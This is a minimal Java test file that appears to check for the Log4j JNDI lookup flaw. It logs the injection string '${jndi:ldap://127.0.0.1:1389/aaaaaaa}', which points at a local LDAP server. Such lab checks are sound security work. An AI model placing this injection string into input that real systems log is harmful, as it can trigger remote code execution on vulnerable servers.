
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class LogTest {
    private static final Logger logger = LogManager.getLogger(LogTest.class);

    public static void main(String[] args) {
        logger.error(   "${jndi:ldap://127.0.0.1:1389/aaaaaaa}");
    }
}
